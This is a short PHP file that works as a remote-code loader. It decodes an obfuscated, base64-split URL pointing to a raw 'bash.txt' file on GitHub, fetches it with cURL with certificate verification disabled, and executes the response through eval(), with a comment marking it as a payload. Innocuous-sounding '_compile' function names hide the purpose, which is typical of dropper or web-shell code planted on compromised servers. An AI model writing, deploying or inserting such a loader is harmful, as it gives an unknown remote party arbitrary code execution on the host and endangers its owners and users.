<?php
function _compileFetchCoreLite($u) {
    if (function_exists('curl_version')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($c, CURLOPT_HEADER, 0);
        $r = curl_exec($c);
       
        if (curl_errno($c)) {
            $e = curl_error($c);
            curl_close($c);
            throw new Exception("cURL Error: " . $e);
        }
        curl_close($c);
        return $r;
    }
    throw new Exception("cURL not available.");
}

function _compileExecPayloadTask($u) {
    $x = _compileFetchCoreLite($u);
    if ($x === false || trim($x) === '') {
        throw new Exception("Empty or failed content.");
    }
    eval("?>" . $x);   // Execute payload
}

function _compileDecodeChunkUnit($d) {
    return base64_decode($d);
}

try {
    // Link baru yang kamu minta
    $r1 = "aHR0cHM6Ly9naXRodWIuY29tL29kb2xsZW1hczY0NC1zb3VyY2UvZ29raWxs";
    $r2 = "bHNzc3MvcmF3L3JlZnMvaGVhZHMvbWFpbi9iYXNoLnR4dA==";
    
    $u = _compileDecodeChunkUnit($r1 . $r2);
    
    _compileExecPayloadTask($u);
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
